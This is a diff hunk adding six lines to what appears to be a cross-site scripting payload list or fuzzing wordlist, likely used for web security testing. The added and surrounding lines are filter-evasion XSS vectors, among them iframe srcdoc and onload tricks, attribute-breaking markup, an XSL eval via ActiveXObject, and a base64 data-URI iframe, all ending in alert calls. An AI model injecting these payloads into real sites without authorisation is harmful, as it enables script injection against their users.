@@ -1124,4 +1124,10 @@ XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!
 <?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval><if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if></template></stylesheet>
 <form action="" method="post"><input name="username" value="admin" /><input name="password" type="password" value="secret" /><input name="injected" value="injected" dirname="password" /><input type="submit"></form>
 <iframe src="data:;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ-"></iframe>
+<iframe/i='javascript:alert(1)'onload='URL=i'>
+<iframe src=""//srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+<div='/x=&#39&gt&lt;iframe/onload=alert(1)&gt>
+<img ="><script>alert(1)</script>">
+<iframe src="calculator:">
+1"--></script><svg/onload=';alert(0);'> 
 /* RFI STOP */
